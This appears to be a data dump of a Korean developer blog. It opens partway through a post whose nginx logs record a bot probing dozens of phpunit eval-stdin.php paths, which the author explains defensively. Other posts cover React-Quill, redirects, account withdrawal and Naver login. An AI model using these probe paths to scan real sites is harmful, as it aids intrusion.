Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:15 +0900] \"POST / HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:15 +0900] \"POST //admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:15 +0900] \"POST //api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:15 +0900] \"POST //backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:16 +0900] \"POST //blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:16 +0900] \"POST //cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:16 +0900] \"POST //demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:16 +0900] \"POST //dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:16 +0900] \"POST //laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:16 +0900] \"POST //lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:17 +0900] \"POST //lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:17 +0900] \"POST //lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:17 +0900] \"POST //lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:17 +0900] \"POST //new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:17 +0900] \"POST //old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:18 +0900] \"POST //panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:18 +0900] \"POST //phpunit/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:18 +0900] \"POST //phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:18 +0900] \"POST //phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:18 +0900] \"POST //phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:18 +0900] \"POST //protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:19 +0900] \"POST //sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:19 +0900] \"POST //vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:19 +0900] \"POST //vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:19 +0900] \"POST //vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:19 +0900] \"POST //vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:19 +0900] \"POST //wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:20 +0900] \"POST //wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:20 +0900] \"POST //wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:20 +0900] \"POST //wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:20 +0900] \"POST //www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n198.46.202.158 - - [20/Apr/2023:05:43:48 +0900] \"GET / HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36\"\n8.36.86.60 - - [20/Apr/2023:09:37:09 +0900] \"GET /robots.txt HTTP/1.1\" 301 178 \"-\" \"python-requests/2.25.1\"\n8.36.86.60 - - [20/Apr/2023:09:37:10 +0900] \"GET / HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 Firefox/33.0\"\n```\n\n**44.202.140.249** 악의적 사용자는 계속 특정 키워드 url로 찔러본다.  \n그리고 헤더 값을 잘 보면 알겠지만 **referer**값이 google로 되어 있다.\n\n이는 구글을 통해 왔다고 흉내내는데 그냥 차단을 방지하기 위해 달아둔 의미없는 값을 넣은 것 같다.  \n저런 키워드는 [Nginx에서 특정 IP 접근 금지 시키기 포스팅](https://elfinlas.github.io/nginx/230401_defense_attacker/#url-keyword)에 잘 정리해뒀다.\n\n그리고 **user-agent**도 예사롭지 않다.... ㅋㅋㅋ\n\n**8.36.86.60** 악의적 사용자는 대놓고 **user-agent**에 **python-requests**를 줬다.  \n그리고는 바로 우디르급 태세전환해서 파폭으로 바꿔줬다.\n\n다 보면 알겠지만 악의적 해킹을 목적으로 가진 사용자는 봇을 만들어서 자동으로 무작위 공격을 하게끔 해뒀다.  \n그리고 저 키워드로 찔렀을 때 응답이 정상으로 오거나 한 것을 토대로 공격 루트를 만들어 오는 것 같다.\n\n흑우집합소를 운영하는 동안 이런 악의적 사용자만 막아도 절반은 성공한게 아닐까 싶다...\n\n## adsense 승인 문제 (진행중)\n\n흑우집합소 내에 광고를 준비하기 위해 adsense를 적용하려 했다.  \n적용 방법은 [Next.Js에 구글 애드센스(Adsense) 등록하기 포스팅](https://elfinlas.github.io/next-js/230404_nextjs_in_adsense/)을 참고하면 된다.\n\n근데 결과는...\n\n![](/img01.png)\n\n역시 쉽지 않다.\n\n사이트를 가보니 다음과 같이 되어 있고...\n\n![](/img02.png)\n\n이유를 보니...\n\n![](/img03.png)\n\n**사이트가 다운되었거나 사용할 수 없음** 이라는 이유다.  \n그래서 내가 지금까지 취한 조치는 다음과 같다.\n\n### 1. nginx 차단\n\n이 부분은 [23년 4월 3일 TIL & 개발노트 포스팅](https://elfinlas.github.io/til/230403_til/)에서 다룬 내용이다.  \n근데 이 부분은 문제의 정답이 아니었던 것 같다.\n\n<br>\n\n### 2. 해외에서 접근 확인\n\n이 부분이 문제일 것 같아서 VPN을 통해서 접근해봤다.\n\n![](/img04.png)\n\n<br>\n\n미국이나 기타 국가에서 접근했음에도 정상적으로 접근이 가능했다.  \n혹시 몰라서 애플의 비공개 릴레이에서도 확인해봤다.\n\n<br>\n\n![](/img05.png)\n\n하지만 접속에는 이상이 없었다.\n\n<br>\n\n### 3. ads.txt 접근 확인 및 코드 미적용\n\n이 부분도 한번 확인해봤으나 정상적으로 적용이 되어 있음을 확인했다.\n\n<br>\n\n### 4. 알려지지 않은 도메인?\n\n몇일 전까지는 내가 search console에 몇 가지 작업을 하지 않아서 등록이 안되었다.  \n그리고 22일쯔음 아래와 같은 메일이 왔다.\n\n![](/img06.png)\n\n<br>\n\n그래서 구글에 현재 흑우집합소라는 키워드를 치면 아래와 같이 잘 나온다.\n\n![](/img07.png)\n\n<br>\n\n그래서 이것도 정답이 아닌 거 같다.\n\n<br>\n\n### 어떻게 해결할 예정?\n\n일단 sitemap이나 그런거 문제일 수도 있을 것 같아서 다시 시도해보려 했지만...  \n너무 많은 신청을 해서 특정 일까지는 검수 불가 판정을 받았다 ^^\n\n나만 그런줄 알았는데 상황이 약간 틀리지만 나와 비슷한 분들을 찾을 수 있었다.\n\n[거절 로그 티스토리 1](https://choisdevil.tistory.com/141)  \n[거절 로그 티스토리 2](https://delpiero.tistory.com/26)\n\n두 티스토리 내용을 보면 알겠지만 나랑 비슷한 상황인 것 같고, 이를 해결했다.  \n일단 검수 신청 가능한 날까진 원인을 다시 찾아보고 포스팅을 성공하면 이를 포스팅으로 남겨보겠다.\n\n```toc\n\n```\n"},{"excerpt":"오랜만에 쓰는 포스팅 포스팅이 많이 늦었다. 4월 초에 많은 일이 있었다. 가족 중 한분이 먼 여행을 떠나시고, 그 뒷정리 및 처리할 게 있어서 잠시 모든 일정을 내려놨다. 짐을 정리하면서 보니 인생이 참 덧없게 느껴지기도 했다. 사설은 네이버 블로그에서 하고... 산 사람은 인생의 일이 남아 있기 때문에 다시 내 일정으로 복귀했다. 흑우집합소 내에 게시…","fields":{"slug":"/til/230417_til/"},"frontmatter":{"date":"April 28, 2023","title":"23년 4월 17일 TIL & 개발노트 (React-Qill 내 이미지 첨부 및 input 먹통 문제)","description":null,"tags":["TIL"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_til.png)\n\n# 오랜만에 쓰는 포스팅\n\n포스팅이 많이 늦었다.  \n4월 초에 많은 일이 있었다.\n\n가족 중 한분이 먼 여행을 떠나시고, 그 뒷정리 및 처리할 게 있어서 잠시 모든 일정을 내려놨다.  \n짐을 정리하면서 보니 인생이 참 덧없게 느껴지기도 했다.\n\n사설은 네이버 블로그에서 하고...  \n산 사람은 인생의 일이 남아 있기 때문에 다시 내 일정으로 복귀했다.\n\n흑우집합소 내에 게시판 기능을 개발하고 있었다.  \n코드 리팩토링도 해야 하지만, 공지사항이나 패치노트 같은 것을 사이트 내부에서 올리는 것이 아닌,  \n외부에서 올리는게 좀 그랬다.\n\n그리고 커뮤니티로 승격하기 위해서는 에디터 기능도 필요했기에...  \n이 부분은 향후 포스팅으로 남길 예정이다.\n\n## 크롬에서 파일 인풋 클릭이 안되는 문제\n\n**React-Quill**에서 에디터 내 이미지 파일 첨부 기능을 개발하고 있었다.  \n사실 그냥 하는건 몹시 쉬운데, 이걸 실제 서비스에 적용하는 부분은 약간 까다로웠다.\n\n이거로 에디터 기능을 구현한 분은 알겠지만,  \n이미지 핸들러를 만들고 그 안에서 **input** 태그를 만들어서 적용해줘야 한다.  \n이 부분은 향후 포스팅에서 자세히 다루기로 하고...\n\n```tsx\nexport const QuillImageHandler = (params: QuillImageHandlerProps) => {\n  return () => {\n    const input = document.createElement(\"input\")\n    input.setAttribute(\"type\", \"file\")\n    input.setAttribute(\"accept\", \"image/*\")\n    input.setAttribute(\"multiple\", \"multiple\")\n    input.click()\n\n    //파일 첨부가 일어날 때 이벤트\n    input.addEventListener(\"change\", async () => {})\n  }\n}\n```\n\n위 코드처럼 작성을 해줬다.  \n근데 신기한게 사파리 브라우저에서는 정말 잘 동작한다.\n\n근데 크롬 브라우저에서는 동작하지 않는다.  \n저 input 태그에 이벤트가 가지 않는다고 해야 하나?\n\n콘솔로 찍어도 동작하지 않고, 강제로 이벤트를 줘도 반응이 없었다.  \n이걸로 한 30분? 왜 그런지 GPT한테도 물어보고 하다가 얘도 이상한 이야기를 해서 직접 찾아봤다.\n\n그래서 찾아본 결과...  \n[Stackoverflow](https://stackoverflow.com/questions/22245500/html-input-type-file-in-google-chrome-not-showing-popup-window)에서 답을 찾을 수 있었다.\n\n위 내용을 요약하면...\n\n![](/img01.png)\n\n### 재부팅하면 된다.\n\n이 자리를 빌어 stackoverflow의 **Luke**님께 감사를...\n\n```toc\n\n```\n"},{"excerpt":"리다이렉션? 흑우집합소를 개발하던 도중 Next.js에서 프론트 쪽 개발을 하고 있었다. 근데 API Router에서 특정 데이터를 처리하다가 다른 페이지로 리다이렉션(Redirect)을 처리했다. 근데 Header에 값을 넣어서 보냈는데 헤더가 제대로 오지 않았다. 뭐가 문제일까 찾아봤다. 원래 안된다. StackOverflow에서 답변을 찾을 수 있었…","fields":{"slug":"/til/230216_til/"},"frontmatter":{"date":"April 10, 2023","title":"23년 2월 16일 TIL & 개발노트 (redirection과 header)","description":null,"tags":["TIL"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_til.png)\n\n# 리다이렉션?\n\n흑우집합소를 개발하던 도중 **Next.js**에서 프론트 쪽 개발을 하고 있었다.  \n근데 API Router에서 특정 데이터를 처리하다가 다른 페이지로 리다이렉션(Redirect)을 처리했다.\n\n근데 Header에 값을 넣어서 보냈는데 헤더가 제대로 오지 않았다.\n\n뭐가 문제일까 찾아봤다.\n\n## 원래 안된다.\n\n[StackOverflow](https://stackoverflow.com/questions/36345696/http-redirect-with-headers)에서 답변을 찾을 수 있었다.  \n그렇다....\n\n원래 안되는 것이었다.  \nHttp 1.0 표준 문제라고 한다.\n\n그래서 저 오버플로우에선 몇 가지 방법을 제시한다.\n\n1. Session 사용하기\n2. 쿠키 사용\n3. Url query parameter 사용하기\n\n보통 많이 사용하는게 3번 방법이라 나도 3번을 사용했다.  \n어짜피 Next.Js에서 페이지 로딩할 때 쿼리를 지울 수 있어서 큰 문제는 없이 해결할 수 있었다.\n\n```toc\n\n```\n"},{"excerpt":"계정 탈퇴 기능을 개발하다가... 흑우집합소 내 계정 탈퇴 기능을 개발하고 있었다. 다른 사이트 보면 계정 탈퇴를 아주 꼭꼭 숨겨두는데, 개인적으로 좀 이해 안되는 행동이다. 사이트에 들어오는건 쉬운데 나가는건 어렵게 한다?  자기네 사이트에 회원을 묶으려는 수작질이다. 한때 유행했던 무슨 UX 패턴이었는데... 나갈 사용자는 어떻게 해서든 찾아서 나간다…","fields":{"slug":"/til/230307_til/"},"frontmatter":{"date":"April 10, 2023","title":"23년 3월 7일 TIL & 개발노트 (흑우집합소 계정 탈퇴 관련)","description":null,"tags":["TIL","흑우집합소"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_til.png)\n\n# 계정 탈퇴 기능을 개발하다가...\n\n흑우집합소 내 계정 탈퇴 기능을 개발하고 있었다.  \n다른 사이트 보면 계정 탈퇴를 아주 꼭꼭 숨겨두는데, 개인적으로 좀 이해 안되는 행동이다.\n\n사이트에 들어오는건 쉬운데 나가는건 어렵게 한다?\n\n![](/img01.jpeg)\n\n자기네 사이트에 회원을 묶으려는 수작질이다.  \n한때 유행했던 무슨 UX 패턴이었는데...\n\n나갈 사용자는 어떻게 해서든 찾아서 나간다.  \n그렇다면 그냥 탈퇴도 쉽게 해주는게 좋지 않을까?\n\n정말 사용작에게 필요한 서비스고 유용하다면 탈퇴해도 다시 돌아올 것이다.  \n그만큼 서비스에 자신이 없는걸까?\n\n무튼 개인적으로 너무 악질이었던 패턴 같다.  \n특히 대기업 서비스에서도 이런걸 하는게 이해하기 어려웠다.  \n대기업이면 나름 서비스에도 자신이 있을텐데 말이다.\n\n서론이 길었다.  \n무튼 탈퇴 로직을 개발하면서 몇 가지 이슈를 찾게 되었다.\n\n## 어떤 이슈인가?\n\n내가 [흑우집합소](https://bcow.world)에서 계정의 경우 닉네임은 고유값(Unique)이다.\n\n초기에 이걸 고려 안해서 탈퇴 후 신규 회원이 해당 닉네임을 사용하려 했더니 불가능했다.  \n그래서 사용자가 탈퇴를 하면 닉네임과 사용자의 상태 값이 변경되게 처리했다.\n\n```typescript\nnickName: getUuid().split(\"-\")[0] + \"-\" + account.nickName,\n```\n\n근데 탈퇴한 사용자가 다시 회원에 가입을 시도할 자꾸 신규 가입 처리가 되었다.  \n원래 정책상 6개월 뒤에 가입이 가능하게끔 했는데 말이다.\n\n그래서 회원 가입쪽 로직을 보니 아래의 로직을 사용하고 있었다.\n\n```typescript\nexport class AccountFindEmailJoinTypeRepository\n  implements FindAccountEmainJoinTypeOutboundPort\n{\n  constructor(\n    @InjectModel(Account.name) private readonly accountModel: Model<Account>\n  ) {}\n\n  async excute(params: FindAccountEmainJoinTypeInputDto): Promise<Account> {\n    return await this.accountModel.findOne({\n      email: params.email,\n      joinType: params.joinType,\n    })\n  }\n}\n```\n\n그렇다...  \n상태 검사 없이 그냥 이메일이랑 조인 타입만 구분해서 처리하고 있었다.\n\n그래서 다른 포트를 구현했다.  \n이메일과 조인타입 그리고 상태 값을 같이 조회하는 로직으로 구현했다.\n\n이렇게 하니 내가 생각한 로직의 방향으로 잘 구현이 되었다.  \n그리고 저렇게 포트 앤 어뎁터 형식을 사용하니 기존 로직에서 변화가 없이 그냥 포트 구현하고, 그 포트를 구현한 구현체 서비스를 주입하는 형태로 쓰니,  \n기존 로직에는 변화가 없이 해당 부분만 수정할 수 있었다.\n\n```typescript\nconst isResignAccount = await this.isResignAcountInbound.excute({\n  email,\n  joinType: ACCOUNT_JOIN_TYPE.SNS_GOOGLE,\n})\nif (isResignAccount.isResign) {\n  throw new AccountException(AccountErrorCode.AccessResignAccount())\n}\n```\n\n원래 이런식으로 6개월 탈퇴를 체크한다.  \n그리고 저 **isResignAcountInbound**메서드에선 실제 해당 계정이 탈퇴를 한 사용자인지 체크를 하는 서비스로직이다.\n\n로직은 아래와 같이 구현되어 있다.\n\n```typescript\nexport class IsResignAccountService implements IsResignAccountInboundPort {\n  constructor(\n    @Inject(FIND_ACCOUNT_EMAIL_JOINTYPE_STATUS_OUTBOUND_PORT)\n    private readonly findAccountEmailJoinTypeStatusOutboundPort: FindAccountEmainJoinTypeStatusOutboundPort\n  ) {}\n\n  async excute(\n    params: IsResignAccountInputDto\n  ): Promise<IsResignAccountOutputDto> {\n    //처리 내용\n  }\n}\n```\n\n**excute**내용은 실무 코드라서 공개는 힘들지만 대략 해당 계정을 조회해서 탈퇴 이력을 찾는 부분이다.\n\n원래는 생성자에서 **FindAccountEmainJoinTypeOutboundPort**라는 포트를 받았지만,  \n이제는 상태 값을 받는 포트를 주입받음으로써 계정의 조회 영역은 별다른 수정 없이 바로 사용할 수 있었다.\n\n좀 더 정확히 설명하자면 기존 로직에서는 다중 계정의 정보가 리턴되어 탈퇴 이력을 정확하게 판단하지 못했다.  \n하지만 이번 로직에서는 바로 상태 값까지 조회하기에 단 하나의 계정만 조회가 된다.\n\n이게 언뜻 보면 너무 당연한 이야기고 간단한 내용이다.  \n하지만 설계를 제대로 안하고, 로직을 복잡하게 하나의 코드에서 다 구현을 했다면....\n\n아마 쉽게 수정하기 어려웠을 것이다.  \n이번 이슈에서 배운 내용은 두 가지이다.\n\n<b>\n\n1. 각 기능에 대한 설계를 잘 해두자.\n2. 로직 아키텍쳐는 심플하게... 하나의 기능만 수행하는 코드를 작성하자.\n\n</b>\n\n<br>\n\n## 정리\n\n과거의 기록을 찾아서 다시 블로그에 정리를 하니...  \n회상도 되고 흑우집합소를 개발하면서 저런 일도 있었구나... 라는게 좋았다.\n\n이렇게 TIL을 잘 모아서 작성하다보면 내가 어떻게 만들고,  \n어떤 이슈를 어떻게 해결했는지 도움이 되는 것 같다.\n\n```toc\n\n```\n"},{"excerpt":"네이버 로그인 포스팅 3부작 Part01 네이버 로그인 구현하기 (Nest.js 코드 구현) Part02 네이버 로그인 구현하기 (네이버 개발자 센터) (현재 글) Part03 네이버 로그인 구현하기 (검수 요청 및 거절 그리고 기타 경험) 검수 요청을 했다. 개발이 다 끝난 뒤 검수 요청을 어떻게 해야 할지 고민이 앞섰다. 먼저 선 배포를 하고 검수를 …","fields":{"slug":"/nest_js/230405_naver_login_part03/"},"frontmatter":{"date":"April 05, 2023","title":"Nest.Js에서 네이버 로그인 구현하기 Part.03 (검수 요청 및 거절 그리고 기타 경험)","description":null,"tags":["NestJs","OAuth"],"series":"NestJs","previewImage":"nestjs_logo.jpg","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_nestjs.png)\n\n<br>\n\n## 네이버 로그인 포스팅 3부작\n\n[Part01 네이버 로그인 구현하기 (Nest.js 코드 구현)](https://elfinlas.github.io/nest_js/230404_naver_login_part01/)  \n[Part02 네이버 로그인 구현하기 (네이버 개발자 센터)](https://elfinlas.github.io/nest_js/230405_naver_login_part02/)  \n[(현재 글) Part03 네이버 로그인 구현하기 (검수 요청 및 거절 그리고 기타 경험)](https://elfinlas.github.io/nest_js/230405_naver_login_part03/)\n\n---\n\n<br>\n\n# 검수 요청을 했다.\n\n개발이 다 끝난 뒤 검수 요청을 어떻게 해야 할지 고민이 앞섰다.\n\n먼저 선 배포를 하고 검수를 해야 하는 것인지...  \n아니면 배포 전 검수를 해야 하는 것인지...  \n만약 배포 전이면 접근 권한을 어떻게 해야 하는지...\n\n![](/img01.png)\n\n그렇다.  \n이 글을 읽으며 네아로를 적용하는 독자가 어떤 서비스를 개발하는지 모르겠지만...\n\n보통이라면 사실 일반 사용자는 여러분의 서비스에 관심이 없다.  \n아니 존재 자체를 잘 모른다.\n\n슬픈 현실이지만 그렇다.  \n당사자야 서비스를 만든 사람이니 잘 알고 기능도 알며, 이제 출시했다 라는 정보를 알지.\n\n일반인은 알 수가 없다.\n\n내가 만든 [로또 서비스 흑우집합소](https://bcow.world)도 이렇게 언급 안하면 아무도 모를 것이다.  \n다시 돌아와서...\n\n즉 보안요소가 강해서 출시 전에 검토를 비공개로 해야 한다면 소명 자료를 쓰면 되고, 그 외에는 그냥 열어둬라.  \n그리고 검수를 받으면 된다.\n\n이제 검수 신청을 해보도록 하자.\n\n## 검수 신청은?\n\n검수 신청을 하면 아래와 같이 각 항목에 대해서 체크를 한다.\n\n### 제공 정보 활용처 확인\n\n![](/img02.png)\n\n여기서 부터 문서를 써야 한다.  \n일단 PDF로 제출하는게 편해서 나는 Mac에서 기본 제공하는 Pages를 이용했다.\n\n각자 알맞는 워드 프로세서로 작성을 하자.  \n형식은 자유다.\n\n그냥 어렵게 생각하지 말고 각 항목에 대해 간략하게 사진 붙이고 설명 쓴다 생각하면 된다.  \n여기 페이지에 있는 내 스크린샷들을 보면 감 올것이다.\n\n참고로 이거 제출안하거나, 자료가 미흡하면 다음과 같은 메일을 받게 된다.\n\n![](/img03.png)\n\n<br>\n\n그러니까 한번에 원큐로 통과하려면 잘 작성하도록 하자.\n\n일단 **정보 제공 활용처 확인** 내역을 작성하자.  \n어느 부분에서 이메일 주소를 사용하고, 닉네임과 프로필 사진은 어디에서 활용되는지를 말이다.\n\n예를 들어 이메일은 사용자 페이지에서 노출된다면 그 부분을 스크린샷 찍고,  \n만약 디비쪽에서 계정 확인용으로 쓰인다면 디비 조회 툴(SQL 콘솔 또는 조회툴(Datagrip 또는 기타) 스크린샷)의 내용을 캡쳐하면 된다.\n\n난 프로필 사진과 별명은 다음과 같이 사용되는 부분을 찍어 제출했다.\n\n![](/img04.png)\n\n<br>\n\n여기서 보면 프로필 사진과 닉네임이 사용됨을 알 수 있다.  \n이 부분은 저기 위 업로드 영역의 **?**버튼을 클릭하면 아래와 같이 알 수 있다.\n\n![](/img05.png)\n\n<br>\n\n### 서비스 적용 형태 확인\n\n![](/img06.png)\n\n여긴 자신의 서비스에 맞는 양식을 선택하면 된다.  \n난 로그인도 하지만, 사용자가 없는 경우 신규 회원 가입을 한다.\n\n회원 가입이 로그인을 포괄하는 개념이기에 난 이것을 선택했다.  \n만약 회원 가입 없이 단순 게시판에 사용자 구분을 위한 서비스라면 단순 로그인 적용을 선택하면 될듯 하다.\n\n카페24는 뭔가 있나보다.  \n그래서 저기서 저렇게 안내한 대로 쓰자. (만약 이용하는 경우?)\n\n여기서도 네아로 이용 절차를 작성해서 내야 하는데 어렵지 않다.  